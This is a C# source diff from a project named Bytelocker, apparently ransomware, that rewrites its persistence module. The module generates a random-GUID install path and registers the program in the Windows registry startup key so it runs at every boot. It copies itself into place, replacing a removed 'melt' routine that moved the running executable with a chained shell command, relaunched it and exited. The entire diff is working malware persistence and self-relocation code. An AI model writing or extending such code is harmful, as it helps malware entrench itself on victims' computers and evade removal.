@@ -1,26 +1,25 @@
 ﻿using Bytelocker.Settings;
-using Bytelocker.Tools;
 using ByteLocker.Detection;
 using System;
+using System.IO;
 
-namespace Bytelocker.Persistence
+namespace Bytelocker.Installer
 {
-    class Melt
+    class Persistence
     {
         public static String REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";
-        public static String NO_MELT_ARG = "-nm";
 
         private String path;
         private String new_path;
         private String random_guid;
 
-        public Melt()
+        public Persistence()
         {
             this.GetRandomGUID();
             this.GetPath();
             this.SetNewPath();
             this.AddToStartup();
-            this.Exec();
+            this.CopyFile();
         }
 
         private void GetRandomGUID()
@@ -41,15 +40,17 @@ namespace Bytelocker.Persistence
         private void AddToStartup()
         {
             RegistryManager rm = new RegistryManager();
-            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, this.new_path, NO_MELT_ARG);
+            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, this.new_path, "");
         }
 
-        private void Exec()
+        private void CopyFile()
         {
-            CommandManager cm = new CommandManager();
-            cm.RunCommand("timeout 3 & move /y " + this.path + " " + this.new_path + " & cd /d " + Environment.GetEnvironmentVariable("APPDATA") 
-                + " & \"" + this.new_path + "\" " + NO_MELT_ARG);
-            System.Environment.Exit(0);
+            try
+            {
+                File.Copy(this.path, this.new_path);
+            } catch (Exception)
+            {
+            }
         }
     }
 }
